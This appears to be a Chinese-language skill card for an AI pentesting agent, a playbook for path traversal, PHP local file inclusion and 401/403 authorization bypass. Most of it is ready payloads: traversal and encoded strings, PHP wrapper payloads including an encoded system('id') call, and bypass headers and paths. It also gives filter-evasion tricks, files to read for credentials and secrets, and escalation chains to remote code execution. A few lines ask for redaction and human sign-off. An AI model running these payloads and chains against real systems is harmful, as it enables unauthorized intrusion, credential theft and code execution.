---
name: path-traversal
description: CWE: 22 / 36 / 285 | ROI: 极高 (P0-P1) 轻便原则: 只放路径遍历 + 401/403 绕过的高 ROI 路由。具体绕过变体不堆。
category: vuln
---

# 路径遍历与鉴权绕过决策卡 (Light Deep Card)

> **CWE**: 22 / 36 / 285 | **ROI**: 极高 (P0-P1)
> **轻便原则**: 只放路径遍历 + 401/403 绕过的高 ROI 路由。具体绕过变体不堆。

---

## 0. First-pass Signal

| 信号 | 判断 | 下一步 |
|------|------|--------|
| 参数含文件名/路径 (`file=` / `path=` / `page=` / `template=` / `lang=`) | 路径遍历入口 | §1 |
| 401/403 响应 | 鉴权绕过可能 | §3 |
| PHP 站点 + 参数指向文件 | LFI 可能 | §1.2 |
| 响应含文件内容 (配置/源码) | 路径遍历确认 | §2 |
| URL 路径含 `/admin` / `/api/internal` 等被拦 | 路径绕过 | §3.2 |

记录三要素: `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

---

## 1. 路径遍历 (LFI/Dir Traversal)

### 1.1 First-pass

```
Linux:   ../../../etc/passwd   (相对路径)
Windows: ..\..\..\..\Windows\win.ini
URL编码:  ..%2f..%2f..%2fetc%2fpasswd
双重编码: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

判断: 响应出现 `root:x:0:0` 或 `[extensions]` → 路径遍历确认。

### 1.2 PHP LFI 专用

| 方法 | Payload |
|------|---------|
| php://filter | `php://filter/convert.base64-encode/resource=index` |
| php://input | `php://input` + POST Body 含 PHP 代码 |
| data:// | `data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+` |
| phar:// | `phar:///tmp/shell.zip/shell.php` |
| session | `/tmp/sess_<PHPSESSID>` (可控内容时) |
| /proc | `/proc/self/environ` (User-Agent 写入代码时) |

### 1.3 判断优先级

```
1. 先测 ../../etc/passwd (最快判断)
2. PHP 站点 → 立即测 php://filter (读源码不执行)
3. 确认后 → 读配置文件找凭证 → §2
4. 有文件包含 → 上传图片马 → [upload.md](upload.md)
```

---

## 2. 高价值文件读取

### 2.1 按技术栈找配置

| 技术 | 文件 |
|------|------|
| PHP Laravel | `.env` (APP_KEY / DB_PASSWORD) |
| PHP 通用 | `config.php` / `wp-config.php` / `database.yml` |
| Java Spring | `application.yml` / `application.properties` |
| Python Django | `settings.py` (SECRET_KEY / DB) |
| Node.js | `.env` / `config.json` / `package.json` |
| Git | `.git/HEAD` → `.git/config` (可能泄露源码) |
| Docker | `/proc/1/environ` (环境变量含密钥) |

### 2.2 凭证利用

读到密钥/密码 → [../sensitive-info-exploitation.md](../sensitive-info-exploitation.md) 三阶段处理。

---

## 3. 401/403 鉴权绕过

### 3.1 HTTP Header 绕过

| Header | 示例 | 适用场景 |
|--------|------|----------|
| `X-Original-URL` | `X-Original-URL: /admin` | Spring / 某些网关 |
| `X-Rewrite-URL` | `X-Rewrite-URL: /admin` | Nginx 重写规则 |
| `X-Forwarded-For` | `X-Forwarded-For: 127.0.0.1` | IP 白名单绕过 |
| `X-Custom-IP-Authorization` | `X-Custom-IP-Authorization: 127.0.0.1` | 自定义 IP 校验 |
| `X-Forwarded-Host` | `X-Forwarded-Host: localhost` | Host 校验绕过 |
| `X-Forwarded-Proto` | `X-Forwarded-Proto: https` | 协议检查绕过 |
| `Referer` | `Referer: https://target.com/admin` | 来源校验绕过 |

### 3.2 路径规范化绕过

| 方法 | 示例 | 原理 |
|------|------|------|
| 路径穿越 | `/xxx/../admin` | 后端规范化为 `/admin` |
| 路径点 | `/.;/admin` | 某些中间件忽略 `;` 后内容 |
| 双斜杠 | `//admin` | 某些路由器把 `//` 当 `/` |
| URL 编码 | `/%61dmin` | 绕过字符串匹配 |
| 大小写 | `/ADMIN` / `/Admin` | 绕过大小写敏感匹配 |
| 反斜杠 | `/\admin` | Windows/IIS 路径分隔 |
| HTTP 方法 | `GET /admin` → `POST /admin` / `PUT /admin` | 方法白名单缺失 |

### 3.3 判断

```
1. 先试 Header 绕过 (X-Original-URL 等) → 最快
2. 再试路径规范化绕过
3. 再试 HTTP 方法变换
4. 确认绕过后 → 记录 + 评估影响
```

---

## 4. 绕过路由

| 过滤 | 绕过方法 |
|------|----------|
| `../` 被删 | `....//` → 删一次 → `../` |
| `../` 被过滤 | `..%2f` / `%2e%2e/` / 双重编码 |
| 起始路径限定 | `path=/var/www/../../etc/passwd` (先满足前缀) |
| 后缀限定 (PHP) | `%00` 截断 (PHP <5.3.4) / 转换编码 |
| WAF 拦截 `etc/passwd` | 读其它文件: `/etc/hostname` / `/proc/self/cmdline` |
| 路径长度限制 | 减少遍历层数: `../etc/passwd` |

---

## 5. Triage

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| 响应无变化 | 过滤生效 / 参数非文件路径 | 换编码/换参数;确认参数用途 |
| 500 / 报错含路径 | 路径拼接出错 → 遍历可能 | 调整遍历深度 |
| 响应含乱码 | php://filter base64 输出 | Base64 解码 |
| 403 但路径遍历生效 | 读权限限制 | 试 /tmp / /proc 等可读路径 |
| 401/403 所有方法都绕不过 | 网关/框架层严格鉴权 | 转参数污染 / 转业务逻辑 |
| 只读到了文件名没内容 | 目录列表但文件不可读 | 试配置文件;可能权限更松 |

---

## 6. 级联

- 路径遍历读配置 → 凭证泄露 → [../sensitive-info-exploitation.md](../sensitive-info-exploitation.md)
- LFI + 上传 → 图片马包含执行 → [upload.md](upload.md)
- 403 绕过 → 管理接口 → [../auth-logic.md](../auth-logic.md)
- 读 .git/HEAD → 源码泄露 → [../recon.md](../recon.md)
- 路径遍历 + SSRF → [ssrf.md](ssrf.md)

---

## 7. Attack Surface

| 入口 | 备注 |
| :--- | :--- |
| **文件下载接口** | `?file=` `?path=` `?download=` |
| **文件查看** | `?page=` `?view=` `?template=` |
| **图片代理** | `?img=` (与 SSRF 邻接) |
| **多语言切换** | `?lang=zh.json` (ThinkPHP CVE-2022-47945 经典) |
| **主题加载** | `?theme=default` |
| **附件 / 文档预览** | id → 拼路径 |
| **静态资源服务** | `/static/{path}` |
| **API 文件参数** | `Content-Disposition: attachment; filename=` |
| **管理后台日志查看** | `?log=access.log` |
| **报表导出文件名** | 拼接 `report_{name}.pdf` |

---

## 8. High-Value Targets

1. **PHP 站点 + `?page=`** — `php://filter` 读源码 (P0)
2. **多语言 / 主题加载** — ThinkPHP / Discuz 历史 LFI (P0)
3. **下载接口 + filename 参数** — 直接拼路径 (P0)
4. **管理后台日志 / 备份** — 权限低但能读敏感文件 (P0)
5. **`/etc/passwd` / `.env` / `application.yml`** — 立即拿凭证 (P0)
6. **Spring `?spring.profiles.active=` 类** — 主动加载配置 (P1)
7. **401/403 重要管理 endpoint** — Header / 路径规范化绕过 (P0)

---

## 9. False Positives

| 误报 | 真实判断 |
| :--- | :--- |
| `../etc/passwd` 返回 root: 但实际是错误页 | 错误模板恰好含 root 字样 | 改读其他唯一字符串文件 |
| 路径遍历 200 但内容空 | 文件存在但不可读 | 试其他可读文件 |
| 401/403 Header 绕过 200 | 可能只是路由层绕过,业务层仍 401 | 测真有意义的 admin API |
| LFI 但响应没文件内容 | 框架做了 sanitize | 试 PHP wrapper |
| 大小写绕过 200 | 可能服务路径不敏感 | 看 Body 是否真是 admin 内容 |

---

## 10. Impact / 升级路径

| 链 | 终态 | Impact |
| :--- | :--- | :--- |
| 读 `.env` / `application.yml` → DB/JWT 密钥 | 全链接管 | Critical |
| 读 `.git/HEAD` → 源码泄露 | 源码 + 历史漏洞挖掘 | Critical |
| php://filter 读源码 → 二次审计 | 全栈漏洞 | Critical |
| LFI + 上传图片马 → RCE | RCE | Critical |
| LFI + /proc/self/environ + UA → RCE | RCE | Critical |
| LFI + nginx access.log → RCE (log poison) | RCE | Critical |
| 读 `/etc/passwd` | 用户列表 | Medium |
| 403 绕过 → 管理 API | 直接管理 | Critical |

**证据 (P3.5)**:
- `.env` / `application.yml` 读取后只截取**部分截图**,密码字段全部脱敏
- 不要直接用拿到的 AK 调云 API,先 HITL
- LFI → RCE 链使用 OOB 验证,不写 webshell

---

## 11. Pro Tips

- **PHP 优先 `php://filter`**: 读源码不执行,最安全方式证明 LFI
- **路径长度试小**: `../etc/passwd` 不行试 `..%2fetc%2fpasswd` 不行试 `....//etc/passwd`
- **`%00` 截断只对老 PHP/Java 有效**: 现代环境基本失效
- **`.env` 永远第一个测**: 现代框架几乎都有
- **`.git/HEAD` + `.git/config` + `.git/HEAD` → 拉完整源码**: 用 `GitTools` 工具拉
- **`/proc/self/environ` + UA**: UA 写入 PHP 代码,LFI 包含执行
- **国内 WAF**: `etc/passwd` 字符串被拦 → 改读 `etc/hosts` `etc/hostname` 等
- **路径规范化 401 绕过**: `;` `..%2f` `//` 是经典三招
- **Header 绕过最快**: `X-Original-URL` / `X-Rewrite-URL` 几秒就能验证
- **HTTP 方法绕过**: `GET /admin` 401 → `POST /admin` / `OPTIONS /admin` / `TRACE /admin`
- **路径区分大小写**: Linux 大小写敏感 Windows 不敏感 → 看后端 OS
- **Spring Cloud Gateway 路径规范化历史**: CVE-2022-22947 类 — frameworks/spring-boot.md
- **`.svn/entries` `.DS_Store` `WEB-INF/web.xml`** 也是经典文件

---

## 12. 工具升级线

**classic 版**:
- 综合: `ffuf -w lfi-wordlist.txt` / Burp Active Scan
- LFI 链: `lfimap` / 手 curl
- 401 绕过: `bypass-403` 类工具 / Nginx Bypass / 手 Header 测试
- Git 拉源码: `GitTools` / `git-dumper`

**toolPlus 版**:
- `mcp__yaklang__http_fuzzer` 一次 sweep 多 path traversal payload + Header 变体
- `mcp__yaklang__exec_codec` URL 编码 + 双编码链
- `mcp__yaklang__ssa_compile language="php/java"` + SyntaxFlow 找 `file_get_contents` / `include` / `Files.read` sink

---

## 13. 相关参考

- 文件上传 → [upload.md](upload.md)
- 命令注入 → [cmdi.md](cmdi.md)
- 认证逻辑 → [../auth-logic.md](../auth-logic.md)
- 信息收集 → [../recon.md](../recon.md)
- WAF 绕过 → [../waf-bypass.md](../waf-bypass.md)
